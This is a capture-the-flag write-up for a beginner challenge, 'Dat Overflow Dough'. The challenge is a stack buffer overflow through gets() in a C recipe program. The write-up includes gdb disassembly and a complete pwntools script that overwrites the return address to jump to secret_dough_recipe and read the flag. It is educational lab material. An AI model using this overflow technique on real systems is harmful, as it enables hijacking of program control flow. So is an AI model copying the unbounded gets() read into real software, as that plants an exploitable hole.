# Dat Overflow Dough

> Pwn

```text
Our new intern has only coded in memory safe languages, but we're trying to optimize, so he has been tasked with re-writing our dough recipe-application in C!

He sent his code to our senior dev for review who added some comments in the code. Upon receiving the reviewed code, the intern accidentally pushed it to production instead of fixing anything.
```

points: `50`

solves: `258`

author: `0xjeppe`

---

We are provided with a bunch of files:

- `code-review.md`: tells that the memory addresses of functions are static
- `recipe.c`: tells that `vulnerable_dough_recipe()` is prone to buffer overflow; `secret_dough_recipe()` is the function we need to call to get the flag
- `exploit.py`: sample pwntools code to overwrite return address
- `exploit`: binary
- `flag.txt`: redacted file to test payload locally

```gdb
(gdb) set disassembly-flavor intel
(gdb) disas vulnerable_dough_recipe 
Dump of assembler code for function vulnerable_dough_recipe:
   0x00000000004011ff <+0>: endbr64
   0x0000000000401203 <+4>: push   rbp
   0x0000000000401204 <+5>: mov    rbp,rsp
   0x0000000000401207 <+8>: sub    rsp,0x10
   0x000000000040120b <+12>:    lea    rax,[rip+0xe06]        # 0x402018
   0x0000000000401212 <+19>:    mov    rdi,rax
   0x0000000000401215 <+22>:    call   0x401080 <puts@plt>
   0x000000000040121a <+27>:    lea    rax,[rbp-0x10]
   0x000000000040121e <+31>:    mov    rdi,rax
   0x0000000000401221 <+34>:    mov    eax,0x0
   0x0000000000401226 <+39>:    call   0x401090 <gets@plt>
   0x000000000040122b <+44>:    nop
   0x000000000040122c <+45>:    leave
   0x000000000040122d <+46>:    ret
End of assembler dump.
```

Buffer of length **0x10**

```gdb
(gdb) disas secret_dough_recipe 
Dump of assembler code for function secret_dough_recipe:
   0x00000000004011b6 <+0>: endbr64
```

Test it locally:

```python
from pwn import *

RECIPE_BUFFER_SIZE = 0x10
RBP_SIZE = 0x8
SECRET_ADDRESS = 0x00000000004011b6
PROMPT = ""

USE_REMOTE = False
REMOTE_HOST = ""
REMOTE_PORT = 0

if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./recipe")
    io = e.process()

payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```

Set `USE_REMOTE`, `REMOTE_HOST`, `REMOTE_PORT` to run it remotely and get the flag
